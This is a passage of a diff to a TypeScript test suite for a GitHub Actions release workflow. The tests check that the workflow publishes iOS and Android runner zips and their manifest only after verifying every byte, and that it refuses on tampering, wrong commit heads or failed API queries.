-      workdir: checkout(fixture, 'run1'),
-      env: { GH_STUB_FAIL: 'api repos' },
-    });
-    assert.equal(run.ok, false, 'a swept-nothing run must not report success');
-    assert.equal(run.failed?.name, 'Open or reuse the manifest PR and arm auto-merge');
-    const calls = ghCalls(fixture);
-    assert.equal(
-      calls.some((c) => c.startsWith('pr merge')),
-      false,
-      'auto-merge must not be armed while a superseded PR may still be open',
-    );
-    assert.equal(fixture.gh.state().prs.find((pr) => pr.number === 7)?.state, 'OPEN');
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('a superseded PR that cannot be closed aborts the job before arming auto-merge', () => {
-  const superseded = 'chore/runner-manifest-v0.76.6';
-  const fixture = createFixture({
-    releaseAssets: completeRelease(),
-    supersededBranches: [superseded],
-    prs: [
-      {
-        number: 7,
-        headRefName: superseded,
-        baseRefName: 'main',
-        state: 'OPEN',
-        autoMerge: 'squash',
-        closeComment: null,
-      },
-    ],
-  });
-  try {
-    const run = runPublish(fixture, {
-      workdir: checkout(fixture, 'run1'),
-      env: { GH_STUB_FAIL: 'pr close' },
-    });
-    assert.equal(run.ok, false, 'a swallowed close would let the stale PR land afterwards');
-    assert.equal(run.failed?.name, 'Open or reuse the manifest PR and arm auto-merge');
-
-    const calls = ghCalls(fixture);
-    assert.ok(
-      calls.some((c) => c.startsWith('pr close')),
-      'it must have tried to close',
-    );
-    assert.equal(
-      calls.some((c) => c.startsWith('pr merge')),
-      false,
-      'auto-merge must not be armed while a superseded PR is still open',
-    );
-    // The sweep precedes PR creation, so this version's PR is not merely
-    // unarmed — it was never opened while a superseded one may still land.
-    assert.equal(
-      fixture.gh.state().prs.some((pr) => pr.headRefName === BRANCH),
-      false,
-    );
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('failing to arm auto-merge fails the job instead of leaving the trust root stale', () => {
-  const fixture = createFixture({ releaseAssets: completeRelease() });
-  try {
-    const run = runPublish(fixture, {
-      workdir: checkout(fixture, 'run1'),
-      env: { GH_STUB_FAIL: 'pr merge' },
-    });
-    assert.equal(
-      run.ok,
-      false,
-      'a silent arming failure is how the manifest rotted for nine releases',
-    );
-    assert.match(run.failed?.stderr ?? '', /::error::could not arm auto-merge/);
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('a failed remote query fails the job instead of reading as "nothing to deliver"', () => {
-  const fixture = createFixture({ releaseAssets: completeRelease() });
-  try {
-    const workdir = checkout(fixture, 'run1');
-    // Transport failure, not a missing ref: git exits 128 here, and 128 must
-    // never be mistaken for "the branch does not exist".
-    git(workdir, 'remote', 'set-url', 'origin', join(fixture.root, 'vanished.git'));
-    const run = runPublish(fixture, { workdir });
-
-    assert.equal(run.ok, false, 'a green run here leaves the trust root undelivered');
-    assert.equal(run.failed?.name, 'Reuse or recreate the version-keyed manifest branch');
-    assert.match(run.failed?.stderr ?? '', /::error::could not ask origin whether/);
-    assert.equal(
-      ghCalls(fixture).some((c) => c.startsWith('pr ')),
-      false,
-      'no PR work may happen once the branch state is unknown',
-    );
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('an already-current trust root with no manifest branch opens no PR', () => {
-  const fixture = createFixture({
-    repoManifest: currentManifest(),
-    releaseAssets: completeRelease(),
-  });
-  try {
-    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
-    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
-    assert.equal(run.outputs.branch.existed, 'false');
-    assert.equal(run.outputs.commit.pushed, 'false', 'an unchanged manifest must not commit');
-    assert.equal(originRef(fixture, BRANCH), null);
-    assert.equal(fixture.gh.state().prs.length, 0, 'nothing to deliver means no PR');
-    assert.match(run.steps.at(-1)?.stdout ?? '', new RegExp(`already carries v${VERSION}`));
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('an approved trust root is republished verbatim, never re-hashed from downloads', () => {
-  // The two reasons a run reaches here having built nothing — a missing manifest
-  // asset, or one that diverged from main — are both repaired by re-uploading
-  // what main already approved. Regenerating from downloads instead would let
-  // whatever the release currently serves rewrite that trust root.
-  const approved = currentManifest();
-  const fixture = createFixture({
-    repoManifest: approved,
-    releaseAssets: { ...completeRelease(), [IOS_ZIP]: 'ios-runner-zip-bytes-substituted' },
-  });
-  try {
-    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
-    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
-    assert.equal(
-      run.outputs.commit.pushed,
-      'false',
-      'the approved trust root must not be rewritten',
-    );
-    assert.equal(originRef(fixture, BRANCH), null);
-    assert.equal(fixture.gh.state().prs.length, 0);
-    assert.equal(
-      readFileSync(fixture.gh.assetPath(TAG, 'runner-manifest.json'), 'utf8'),
-      approved,
-      'the release asset is re-anchored to what main approved',
-    );
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('a rebuild is what lets downloaded digests become the trust root', () => {
-  const fixture = createFixture({
-    repoManifest: currentManifest(),
-    releaseAssets: { ...completeRelease(), [IOS_ZIP]: 'ios-runner-zip-bytes-rebuilt-from-source' },
-  });
-  try {
-    const run = runPublish(fixture, {
-      workdir: checkout(fixture, 'run1'),
-      ctx: { 'needs.detect.outputs.build': 'true' },
-    });
-    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
-    assert.equal(run.outputs.commit.pushed, 'true', 'freshly built zips do move the trust root');
-    const head = originRef(fixture, BRANCH);
-    assert.equal(
-      JSON.parse(
-        git(fixture.root, '--git-dir', fixture.origin, 'show', `${head}:runner-manifest.json`),
-      ).assets.ios[0].sha256,
-      sha256('ios-runner-zip-bytes-rebuilt-from-source'),
-    );
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('a manifest branch left behind identical to main opens no PR', () => {
-  // Closing a PR without merging does NOT delete its head branch (only a merge
-  // does, via delete_branch_on_merge), so the branch can survive while the trust
-  // root reaches main another way. It is then identical to main, and GitHub
-  // refuses `gh pr create` for a head with no commits between it and the base —
-  // which would fail a run whose actual repair (re-uploading the release asset)
-  // has already succeeded.
-  const fixture = createFixture({
-    repoManifest: currentManifest(),
-    releaseAssets: completeRelease(),
-    supersededBranches: [BRANCH],
-  });
-  try {
-    const mainHead = originRef(fixture, 'main');
-    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
-    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
-    assert.equal(run.outputs.branch.existed, 'true');
-    assert.equal(run.outputs.branch.ahead, '0', 'the branch delivers nothing');
-    assert.equal(run.outputs.commit.pushed, 'false');
-    assert.equal(fixture.gh.state().prs.length, 0, 'there is nothing to open a PR for');
-    assert.equal(originRef(fixture, BRANCH), mainHead, 'the branch is left exactly as it was');
-    assert.equal(
-      fixture.gh.state().releases[TAG].assets['runner-manifest.json'].uploads,
-      1,
-      'the repair this run existed for — refreshing the release asset — still happened',
-    );
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('a superseded PR is retired even when this run has nothing of its own to deliver', () => {
-  // Reachable whenever the trust root reached main by some other route (a
-  // maintainer's own PR) while the release still lacks its manifest asset:
-  // detect says publish, this job re-uploads the asset, and finds no branch and
-  // nothing to commit. Returning there would leave an armed PR from an earlier
-  // version free to land afterwards and rewrite main's trust root backwards.
-  const superseded = 'chore/runner-manifest-v0.76.6';
-  const fixture = createFixture({
-    repoManifest: currentManifest(),
-    releaseAssets: completeRelease(),
-    supersededBranches: [superseded],
-    prs: [
-      {
-        number: 7,
-        headRefName: superseded,
-        baseRefName: 'main',
-        state: 'OPEN',
-        autoMerge: 'squash',
-        closeComment: null,
-      },
-    ],
-  });
-  try {
-    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
-    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
-    assert.equal(run.outputs.commit.pushed, 'false', 'this run has nothing of its own to deliver');
-
-    const state = fixture.gh.state();
-    assert.equal(
-      state.prs.find((pr) => pr.number === 7)?.state,
-      'CLOSED',
-      'an armed PR from an earlier version must not survive a run with nothing to deliver',
-    );
-    assert.equal(originRef(fixture, superseded), null, 'its branch must be deleted too');
-    assert.equal(
-      state.prs.some((pr) => pr.headRefName === BRANCH),
-      false,
-      'nothing to deliver still means no PR of its own',
-    );
-    assert.equal(originRef(fixture, BRANCH), null);
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('the publish job refuses a trust root the installed plugin cannot use', () => {
-  const fixture = createFixture({ pluginVersion: '0.76.8', releaseAssets: completeRelease() });
-  try {
-    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
-    assert.equal(
-      run.ok,
-      false,
-      'a v0.76.7 manifest would send every v0.76.8 client to a local build',
-    );
-    assert.equal(
-      run.failed?.name,
-      'Refuse to deliver a trust root the installed plugin cannot use',
-    );
-    assert.match(run.failed?.stderr ?? '', /refusing to publish a v0\.76\.7 trust root/);
-
-    assert.equal(originRef(fixture, BRANCH), null, 'nothing may be pushed after the refusal');
-    assert.equal(fixture.gh.state().prs.length, 0);
-    assert.equal(
-      ghCalls(fixture).some((c) => c.startsWith('release upload')),
-      false,
-      'the release must not be rewritten either',
-    );
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('detect reports a stale trust root even when the release is complete', () => {
-  const fixture = createFixture({
-    releaseAssets: { ...completeRelease(), 'runner-manifest.json': currentManifest() },
-  });
-  try {
-    const run = runDetect(fixture);
-    assert.ok(run.ok, `detect failed: ${run.failed?.stderr}`);
-    assert.deepEqual(run.outputs.v, {
-      version: VERSION,
-      build: 'false',
-      publish: 'true',
-      branch: BRANCH,
-    });
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('detect stands down once the in-repo trust root matches the published manifest', () => {
-  const current = currentManifest();
-  const fixture = createFixture({
-    repoManifest: current,
-    releaseAssets: { ...completeRelease(), 'runner-manifest.json': current },
-  });
-  try {
-    const run = runDetect(fixture);
-    assert.ok(run.ok, `detect failed: ${run.failed?.stderr}`);
-    assert.equal(run.outputs.v.publish, 'false');
-    assert.equal(run.outputs.v.build, 'false');
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('detect treats a version with no release yet as unpublished', () => {
-  const fixture = createFixture({});
-  try {
-    const run = runDetect(fixture);
-    assert.ok(run.ok, `detect failed: ${run.failed?.stderr}`);
-    assert.equal(run.outputs.v.build, 'true');
-    assert.equal(run.outputs.v.publish, 'true');
-  } finally {
-    fixture.cleanup();
-  }
-});
-
-test('detect refuses to read a failed release listing as an empty release', () => {
-  // "No release yet" and "the API blipped" both used to yield an empty asset
-  // list, which rebuilds zips the release already serves correctly — and since
-  // neither Xcode nor Gradle is byte-reproducible, the replacements drift from
-  // the trust root and send every install to a local build.
-  const current = currentManifest();
-  const fixture = createFixture({
-    repoManifest: current,
-    releaseAssets: { ...completeRelease(), 'runner-manifest.json': current },
-  });
+test('validate accepts H when the trust root equals the producer handoff and native inputs are unchanged', () => {
+  const fixture = createFixture({ prepared: true });
   try {
     const run = runJobSteps({
-      workflow,
-      jobId: 'detect',
-      cwd: checkout(fixture, 'detect'),
-      ctx: DETECT_CTX,
-      env: { ...fixture.gh.env, GH_STUB_FAIL: 'release view' },
-      only: ['Decide what this run must build and publish'],
+      workflow: release,
+      jobId: 'validate',
+      cwd: checkout(fixture, fixture.head!),
+      ctx: releaseCtx(fixture, treeCtx(fixture, fixture.candidate)),
+      env: baseEnv(fixture),
+      only: [PREPARED_STEP],
     });
-    assert.equal(run.ok, false, 'a blip must not be readable as "nothing is published"');
-    assert.match(run.failed?.stderr ?? '', /::error::could not determine what release/);
-    assert.deepEqual(run.outputs.v, {}, 'no build decision may escape an unknown release state');
+    assert.ok(run.ok, run.failed?.stderr);
+    assert.match(stepStdout(run, PREPARED_STEP), /action=prepared/);
   } finally {
     fixture.cleanup();
   }
 });
 
-test('detect creates the release for this version only when it is missing', () => {
-  const fixture = createFixture({});
+test('validate refuses H when the producer built other native inputs or other bytes', () => {
+  const fixture = createFixture({ prepared: true });
   try {
-    const workdir = checkout(fixture, 'detect');
-    const ctx = { 'secrets.GITHUB_TOKEN': 'stub-token', 'steps.v.outputs.version': VERSION };
-    const only = ['Create the release for this version (idempotent)'];
-    const first = runJobSteps({
-      workflow,
-      jobId: 'detect',
-      cwd: workdir,
-      ctx,
-      env: fixture.gh.env,
-      only,
+    const trees = treeCtx(fixture, fixture.candidate);
+    const otherTree = runJobSteps({
+      workflow: release,
+      jobId: 'validate',
+      cwd: checkout(fixture, fixture.head!),
+      ctx: releaseCtx(fixture, { ...trees, 'needs.prepare.outputs.ios-tree': SHA_B }),
+      env: baseEnv(fixture),
+      only: [PREPARED_STEP],
     });
-    assert.ok(first.ok, first.failed?.stderr);
-    const second = runJobSteps({
-      workflow,
-      jobId: 'detect',
-      cwd: workdir,
-      ctx,
-      env: fixture.gh.env,
-      only,
+    assert.equal(otherTree.ok, false);
+    assert.match(otherTree.failed!.stderr, /iOS runner sources differ/);
+    const otherBytes = runJobSteps({
+      workflow: release,
+      jobId: 'validate',
+      cwd: checkout(fixture, fixture.head!),
+      ctx: releaseCtx(fixture, {
+        ...trees,
+        'needs.prepare.outputs.android-sha256': sha256('rebuilt'),
+      }),
+      env: baseEnv(fixture),
+      only: [PREPARED_STEP],
     });
-    assert.ok(second.ok, `a rerun must not fail on an existing release: ${second.failed?.stderr}`);
-    assert.equal(
-      ghCalls(fixture).filter((c) => c.startsWith('release create')).length,
-      1,
-      'the release must be created once, then reused',
-    );
-    assert.deepEqual(Object.keys(fixture.gh.state().releases), [TAG]);
+    assert.equal(otherBytes.ok, false);
+    assert.match(otherBytes.failed!.stderr, /does not match the producer handoff/);
   } finally {
     fixture.cleanup();
   }
 });
 
-for (const [jobId, asset, bytes] of [
-  ['build-ios', IOS_ZIP, IOS_BYTES],
-  ['build-android', ANDROID_ZIP, ANDROID_BYTES],
-] as const) {
-  test(`${jobId} uploads only its own asset, and a rerun replaces it`, () => {
-    const fixture = createFixture({ releaseAssets: {} });
+test('validate reaches its verdict offline: no release asset is ever consulted', () => {
+  const fixture = createFixture({ prepared: true });
+  try {
+    const run = runJobSteps({
+      workflow: release,
+      jobId: 'validate',
+      cwd: checkout(fixture, fixture.head!),
+      ctx: releaseCtx(fixture, treeCtx(fixture, fixture.candidate)),
+      env: baseEnv(fixture),
+      only: [PREPARED_STEP],
+    });
+    assert.ok(run.ok, run.failed?.stderr);
+    assert.deepEqual(ghCalls(fixture), []);
+  } finally {
+    fixture.cleanup();
+  }
+  // The remaining steps (dist freshness, unit/integration tests, version sync)
+  // cannot run in the fixture; their commands are checked as commands.
+  for (const step of steps(release, 'validate')) {
+    if (!step.run) continue;
+    for (const tokens of shellCommands(step.run).map(withoutGlobalOptions)) {
+      assert.notEqual(tokens[0], 'gh', `validate step "${step.name}": ${tokens.join(' ')}`);
+    }
+  }
+});
+
+// --- publish: draft targeting H, read back, then published ---
+
+const READ_STEP = "Read the candidate's files by SHA";
+const HANDOFF_STEP = 'Verify the handoff against the producer identity and the candidate';
+const DECIDE_STEP = 'Decide against the release state for this version';
+const RETIRE_STEP = 'Retire the stale draft (prepublication state only)';
+const STAGE_STEP = 'Stage the draft release from the retained bytes, targeting the candidate';
+const READBACK_STEP = 'Read the release back and compare every byte with the candidate trust root';
+const PUBLISH_STEP = 'Publish the verified draft';
+const CONFIRM_STEP = 'Confirm the public release is from the exact candidate';
+
+function runPublish(
+  fixture: Fixture,
+  only: string[],
+  { ctx = {}, env = {} }: { ctx?: Record<string, string>; env?: Record<string, string> } = {},
+) {
+  const dir = checkout(fixture, 'main');
+  handoff(dir);
+  return runJobSteps({
+    workflow: release,
+    jobId: 'publish',
+    cwd: dir,
+    ctx: releaseCtx(fixture, ctx),
+    env: { ...baseEnv(fixture), ...env },
+    only,
+  });
+}
+
+const PUBLISH_PATH = [
+  READ_STEP,
+  HANDOFF_STEP,
+  DECIDE_STEP,
+  STAGE_STEP,
+  READBACK_STEP,
+  PUBLISH_STEP,
+  CONFIRM_STEP,
+];
+
+test('first publication stages a draft targeting H, uploads the retained bytes once, reads them back, then publishes', () => {
+  const fixture = createFixture({ prepared: true });
+  try {
+    const run = runPublish(fixture, PUBLISH_PATH);
+    assert.ok(run.ok, run.failed?.stderr);
+    assert.equal(run.outputs.decide.action, 'publish');
+    const state = fixture.gh.state();
+    assert.equal(state.releases[TAG].draft, false);
+    assert.equal(state.releases[TAG].target, fixture.head);
+    assert.equal(state.tags[TAG], fixture.head);
+    assert.deepEqual(
+      Object.fromEntries(
+        Object.entries(state.releases[TAG].assets).map(([name, a]) => [name, a.uploads]),
+      ),
+      { [IOS_ZIP]: 1, [ANDROID_ZIP]: 1, 'runner-manifest.json': 1 },
+    );
+    assert.equal(
+      readFileSync(fixture.gh.assetPath(TAG, 'runner-manifest.json'), 'utf8'),
+      manifestFor(),
+    );
+    const calls = ghCalls(fixture);
+    assert.ok(
+      calls.some((c) => c.startsWith(`release create ${TAG} --draft --target ${fixture.head}`)),
+      calls.join('\n'),
+    );
+    const create = calls.findIndex((c) => c.startsWith('release create'));
+    const publish = calls.findIndex((c) => c === `release edit ${TAG} --draft=false`);
+    const readback = calls.findIndex((c) => c.startsWith(`release download ${TAG} --dir readback`));
+    assert.ok(create < readback && readback < publish, 'draft -> read back -> publish');
+    assert.ok(!calls.some((c) => c.includes('--clobber')), 'no upload ever clobbers');
+    assert.ok(!calls.some((c) => c.startsWith('release delete')));
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a rerun after publication is a no-op retry: nothing is created, uploaded or re-published', () => {
+  const fixture = createFixture({ prepared: true });
+  try {
+    assert.ok(runPublish(fixture, PUBLISH_PATH).ok);
+    const before = fixture.gh.state();
+    const run = runPublish(fixture, [
+      READ_STEP,
+      HANDOFF_STEP,
+      DECIDE_STEP,
+      READBACK_STEP,
+      CONFIRM_STEP,
+    ]);
+    assert.ok(run.ok, run.failed?.stderr);
+    assert.equal(run.outputs.decide.action, 'already-public');
+    assert.deepEqual(fixture.gh.state().releases, before.releases);
+    const calls = ghCalls(fixture).slice(fixture.gh.calls().length / 2);
+    assert.ok(!calls.some((c) => /^release (create|upload|edit|delete)/.test(c)), calls.join('\n'));
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test("a stale draft from an earlier candidate is retired and rebuilt from this run's retained bytes", () => {
+  const fixture = createFixture({
+    prepared: true,
+    releases: {
+      [TAG]: { assets: { [IOS_ZIP]: 'draft-from-an-older-candidate' }, draft: true, target: SHA_B },
+    },
+  });
+  try {
+    const run = runPublish(fixture, [
+      READ_STEP,
+      HANDOFF_STEP,
+      DECIDE_STEP,
+      RETIRE_STEP,
+      STAGE_STEP,
+      READBACK_STEP,
+      PUBLISH_STEP,
+      CONFIRM_STEP,
+    ]);
+    assert.ok(run.ok, run.failed?.stderr);
+    assert.equal(run.outputs.decide.action, 'replace-draft');
+    const state = fixture.gh.state();
+    assert.equal(state.releases[TAG].target, fixture.head);
+    assert.equal(readFileSync(fixture.gh.assetPath(TAG, IOS_ZIP), 'utf8'), IOS_BYTES);
+    const calls = ghCalls(fixture);
+    assert.ok(
+      calls.indexOf(`release delete ${TAG} --yes`) <
+        calls.findIndex((c) => c.startsWith('release create')),
+    );
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a release already published from another head refuses before any write', () => {
+  const fixture = createFixture({
+    prepared: true,
+    releases: {
+      [TAG]: {
+        assets: {
+          [IOS_ZIP]: IOS_BYTES,
+          [ANDROID_ZIP]: ANDROID_BYTES,
+          'runner-manifest.json': manifestFor(),
+        },
+        draft: false,
+        target: SHA_B,
+      },
+    },
+    tags: { [TAG]: SHA_B },
+  });
+  try {
+    const run = runPublish(fixture, PUBLISH_PATH);
+    assert.equal(run.ok, false);
+    assert.equal(run.failed!.name, DECIDE_STEP);
+    assert.match(run.failed!.stderr, /published from b{40}, not the candidate/);
+    assert.match(run.failed!.stderr, /published-but-not-advertised/);
+    assert.ok(!ghCalls(fixture).some((c) => /^release (create|upload|edit|delete)/.test(c)));
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a tag bound elsewhere regenerates the candidate; publish alone refuses it', () => {
+  const fixture = createFixture({
+    prepared: true,
+    prs: [versionPr()],
+    tags: { [TAG]: SHA_B },
+    releases: { [TAG]: { assets: {}, draft: false, target: SHA_B } },
+  });
+  try {
+    const pending = runVersionStep(fixture, PENDING_STEP);
+    assert.ok(pending.ok, pending.failed?.stderr);
+    assert.equal(pending.outputs.pending.resume, 'false');
+    const publish = runPublish(fixture, PUBLISH_PATH);
+    assert.equal(publish.ok, false);
+    assert.equal(publish.failed!.name, DECIDE_STEP);
+    assert.match(publish.failed!.stderr, /published from b{40}, not the candidate/);
+    assert.match(publish.failed!.stderr, /published-but-not-advertised/);
+    assert.ok(!ghCalls(fixture).some((c) => /^release (create|upload|edit|delete)/.test(c)));
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a published release missing a zip is partial and refuses', () => {
+  const fixture = createFixture({
+    prepared: true,
+    releases: {
+      [TAG]: {
+        assets: { [IOS_ZIP]: IOS_BYTES, 'runner-manifest.json': manifestFor() },
+        draft: false,
+        target: SHA_A,
+      },
+    },
+  });
+  try {
+    const head = fixture.head!;
+    const state = fixture.gh.state();
+    state.releases[TAG].target = head;
+    state.tags[TAG] = head;
+    writeFileSync(join(fixture.root, 'gh-state', 'state.json'), JSON.stringify(state));
+    const run = runPublish(fixture, PUBLISH_PATH);
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /without both runner zips/);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('tampered public bytes fail the read-back and are never re-published', () => {
+  const fixture = createFixture({ prepared: true });
+  try {
+    assert.ok(runPublish(fixture, PUBLISH_PATH).ok);
+    writeFileSync(fixture.gh.assetPath(TAG, ANDROID_ZIP), 'replacement-bytes-of-the-same-length');
+    const run = runPublish(fixture, [
+      READ_STEP,
+      HANDOFF_STEP,
+      DECIDE_STEP,
+      READBACK_STEP,
+      CONFIRM_STEP,
+    ]);
+    assert.equal(run.ok, false);
+    assert.equal(run.failed!.name, READBACK_STEP);
+    assert.match(run.failed!.stderr, /release sha256 .* != candidate/);
+    assert.ok(!ghCalls(fixture).some((c) => c.includes('--clobber')));
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a staged draft whose bytes were swapped before publication never publishes', () => {
+  const fixture = createFixture({ prepared: true });
+  try {
+    const run = runPublish(fixture, [READ_STEP, HANDOFF_STEP, DECIDE_STEP, STAGE_STEP], {});
+    assert.ok(run.ok, run.failed?.stderr);
+    writeFileSync(fixture.gh.assetPath(TAG, IOS_ZIP), 'swapped');
+    const readback = runPublish(fixture, [READ_STEP, READBACK_STEP, PUBLISH_STEP, CONFIRM_STEP]);
+    assert.equal(readback.ok, false);
+    assert.equal(readback.failed!.name, READBACK_STEP);
+    assert.equal(fixture.gh.state().releases[TAG].draft, true, 'stays a draft');
+    assert.equal(fixture.gh.state().tags[TAG], undefined, 'no tag is created');
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('retained bytes that disagree with the candidate trust root are refused before the release is touched', () => {
+  const fixture = createFixture({ prepared: true });
+  try {
+    const dir = checkout(fixture, 'main');
+    handoff(dir, 'different-ios-bytes');
+    const run = runJobSteps({
+      workflow: release,
+      jobId: 'publish',
+      cwd: dir,
+      ctx: releaseCtx(fixture, {
+        'needs.prepare.outputs.ios-sha256': sha256('different-ios-bytes'),
+      }),
+      env: baseEnv(fixture),
+      only: PUBLISH_PATH,
+    });
+    assert.equal(run.ok, false);
+    assert.equal(run.failed!.name, HANDOFF_STEP);
+    assert.match(run.failed!.stderr, /!= candidate trust root/);
+    assert.ok(!ghCalls(fixture).some((c) => c.startsWith('release')));
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a release listing that cannot be read is never taken as "no release"', () => {
+  const fixture = createFixture({ prepared: true });
+  try {
+    const run = runPublish(fixture, PUBLISH_PATH, { env: { GH_STUB_FAIL: 'release view,api' } });
+    assert.equal(run.ok, false);
+    assert.equal(run.failed!.name, DECIDE_STEP);
+    assert.match(run.failed!.stderr, /refusing to guess/);
+    assert.ok(!ghCalls(fixture).some((c) => c.startsWith('release create')));
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a candidate that does not advertise the pinned version is refused', () => {
+  const fixture = createFixture({ prepared: true });
+  try {
+    const run = runPublish(fixture, PUBLISH_PATH, {
+      ctx: { 'needs.version.outputs.version': '0.76.8' },
+    });
+    assert.equal(run.ok, false);
+    assert.equal(run.failed!.name, READ_STEP);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a resumed published candidate is read back byte for byte before its merge', () => {
+  const fixture = createFixture({ prepared: true });
+  try {
+    assert.ok(runPublish(fixture, PUBLISH_PATH).ok);
+    const resumed = runJobSteps({
+      workflow: release,
+      jobId: 'publish',
+      cwd: checkout(fixture, 'main'),
+      ctx: releaseCtx(fixture, {
+        'needs.version.outputs.resume': 'true',
+        'needs.version.outputs.head-sha': fixture.head!,
+        'needs.finalize.outputs.head-sha': '',
+      }),
+      env: baseEnv(fixture),
+      only: [READ_STEP, READBACK_STEP, CONFIRM_STEP],
+    });
+    assert.ok(resumed.ok, resumed.failed?.stderr);
+    writeFileSync(fixture.gh.assetPath(TAG, IOS_ZIP), 'swapped-after-publication');
+    const tampered = runJobSteps({
+      workflow: release,
+      jobId: 'publish',
+      cwd: checkout(fixture, 'main'),
+      ctx: releaseCtx(fixture, {
+        'needs.version.outputs.resume': 'true',
+        'needs.version.outputs.head-sha': fixture.head!,
+        'needs.finalize.outputs.head-sha': '',
+      }),
+      env: baseEnv(fixture),
+      only: [READ_STEP, READBACK_STEP, CONFIRM_STEP],
+    });
+    assert.equal(tampered.ok, false);
+    assert.equal(tampered.failed!.name, READBACK_STEP);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+// --- merge: readiness on the exact head, then --match-head-commit ---
+
+function check(conclusion: string | null, status = 'completed'): GhCheckRun {
+  return {
+    name: 'Build & Test',
+    status,
+    conclusion,
+    html_url: 'https://github.com/x/actions/runs/1/job/2',
+    app: { slug: 'github-actions' },
+  };
+}
+
+function runMerge(fixture: Fixture, ctx: Record<string, string> = {}) {
+  return runJobSteps({
+    workflow: release,
+    jobId: 'merge',
+    cwd: fixture.root,
+    ctx: releaseCtx(fixture, ctx),
+    env: { ...baseEnv(fixture), READINESS_WAIT_MINUTES: '0', READINESS_POLL_SECONDS: '0' },
+  });
+}
+
+// A release published from H the way the publish job leaves it.
+function publishedFixture(options: FixtureOptions = {}): Fixture {
+  const fixture = createFixture({ prepared: true, prs: [versionPr()], ...options });
+  const head = fixture.head!;
+  const state = fixture.gh.state();
+  state.releases[TAG] = {
+    assets: {
+      [IOS_ZIP]: { uploads: 1 },
+      [ANDROID_ZIP]: { uploads: 1 },
+      'runner-manifest.json': { uploads: 1 },
+    },
+    draft: false,
+    target: head,
+  };
+  state.tags[TAG] = head;
+  writeFileSync(join(fixture.root, 'gh-state', 'state.json'), JSON.stringify(state));
+  mkdirSync(dirname(fixture.gh.assetPath(TAG, IOS_ZIP)), { recursive: true });
+  writeFileSync(fixture.gh.assetPath(TAG, IOS_ZIP), IOS_BYTES);
+  writeFileSync(fixture.gh.assetPath(TAG, ANDROID_ZIP), ANDROID_BYTES);
+  writeFileSync(fixture.gh.assetPath(TAG, 'runner-manifest.json'), manifestFor());
+  return fixture;
+}
+
+test('with the release public and Build & Test green on H, exactly H is squash-merged', () => {
+  const fixture = publishedFixture();
+  try {
+    const state = fixture.gh.state();
+    state.checks[fixture.head!] = [check('success')];
+    writeFileSync(join(fixture.root, 'gh-state', 'state.json'), JSON.stringify(state));
+    const run = runMerge(fixture);
+    assert.ok(run.ok, run.failed?.stderr);
+    assert.equal(fixture.gh.state().prs[0].state, 'MERGED');
+    assert.ok(
+      ghCalls(fixture).includes(`pr merge --squash --match-head-commit ${fixture.head} 11`),
+    );
+    assert.ok(!ghCalls(fixture).some((c) => c.includes('--auto')), 'never auto-merge');
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a bot-opened PR whose CI still awaits approval fails with the approve/rerun instruction and merges nothing', () => {
+  const fixture = publishedFixture();
+  try {
+    const run = runMerge(fixture);
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /Approve and run/);
+    assert.match(run.failed!.stderr, /re-run this workflow's failed jobs/);
+    assert.equal(fixture.gh.state().prs[0].state, 'OPEN');
+    assert.ok(!ghCalls(fixture).some((c) => c.startsWith('pr merge')));
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a queued or running check is waited for, not treated as failure', () => {
+  const fixture = publishedFixture();
+  try {
+    const state = fixture.gh.state();
+    state.checks[fixture.head!] = [check(null, 'in_progress')];
+    writeFileSync(join(fixture.root, 'gh-state', 'state.json'), JSON.stringify(state));
+    const run = runMerge(fixture);
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /no successful Build & Test check on .* yet \(in_progress/);
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a failed Build & Test on H refuses and names the rerun, never a bypass', () => {
+  const fixture = publishedFixture();
+  try {
+    const state = fixture.gh.state();
+    state.checks[fixture.head!] = [check('failure')];
+    writeFileSync(join(fixture.root, 'gh-state', 'state.json'), JSON.stringify(state));
+    const run = runMerge(fixture);
+    assert.equal(run.ok, false);
+    assert.match(run.failed!.stderr, /concluded failure .* rerun that CI run/);
+    assert.ok(!ghCalls(fixture).some((c) => c.startsWith('pr merge')));
+  } finally {
+    fixture.cleanup();
+  }
+});
+
+test('a check that passed on another head never counts for H', () => {
+  const fixture = publishedFixture();
+  try {
+    const state = fixture.gh.state();
+    state.checks[fixture.candidate] = [check('success')];
